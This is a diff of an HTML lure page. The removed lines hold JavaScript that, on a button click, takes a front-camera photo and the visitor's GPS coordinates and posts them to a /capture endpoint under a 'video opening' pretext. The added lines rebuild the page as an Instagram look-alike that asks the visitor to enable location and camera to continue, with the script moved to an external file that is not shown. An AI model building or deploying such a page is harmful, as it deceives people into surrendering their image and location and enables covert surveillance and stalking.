@@ -1,36 +1,39 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Video açılır...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Video</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <h2>📸 Kamera və 📍 Lokasiya icazəsi tələb olunur...</h2>
-  <button id="startBtn">▶️ Başla</button>
+  <div class="insta-container">
+    <header>
+      <div class="logo">Instagram</div>
+    </header>
 
-  <script>
-    document.getElementById('startBtn').addEventListener('click', async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        const blob = await imageCapture.takePhoto();
+    <main>
+      <div class="video-post">
+        <div class="user-info">
+          <img src="https://via.placeholder.com/40" alt="User" class="avatar">
+          <span class="username">user123</span>
+        </div>
+        <video id="video" controls autoplay muted>
+          <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        </video>
+        <div class="actions">
+          <button id="like-btn">❤️ Like</button>
+          <button id="share-btn">🔗 Share</button>
+        </div>
+      </div>
 
-        const pos = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
-        });
+      <div class="capture-section">
+        <h3>Enable location and camera to continue</h3>
+        <button id="start-btn">Start</button>
+      </div>
+    </main>
+  </div>
 
-        const formData = new FormData();
-        formData.append("photo", blob, "selfie.jpg");
-        formData.append("latitude", pos.coords.latitude);
-        formData.append("longitude", pos.coords.longitude);
-
-        await fetch("/capture", { method: "POST", body: formData });
-        alert("✅ Məlumat göndərildi!");
-      } catch (err) {
-        alert("❌ Səhv oldu: " + err.message);
-      }
-    });
-  </script>
+  <script src="scripts.js"></script>
 </body>
 </html>
